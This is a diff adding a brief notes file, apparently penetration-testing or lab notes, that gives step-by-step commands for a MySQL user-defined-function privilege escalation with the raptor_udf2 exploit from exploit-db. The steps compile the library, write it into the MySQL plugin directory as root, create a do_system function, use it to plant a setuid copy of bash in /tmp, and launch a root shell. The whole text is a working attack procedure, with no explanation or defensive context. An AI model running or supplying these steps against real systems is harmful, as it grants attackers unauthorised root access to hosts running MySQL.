@@ -1,0 +1,11 @@
+get file from https://www.exploit-db.com/exploits/1518
+1. gcc -g -c raptor_udf2.c -fPIC
+2. gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+3. mysql -u root
+4. use mysql;
+5. create table foo(line blob);
+6. insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+7. select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+8. create function do_system returns integer soname 'raptor_udf2.so';
+9. select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+10. /tmp/rootbash -p
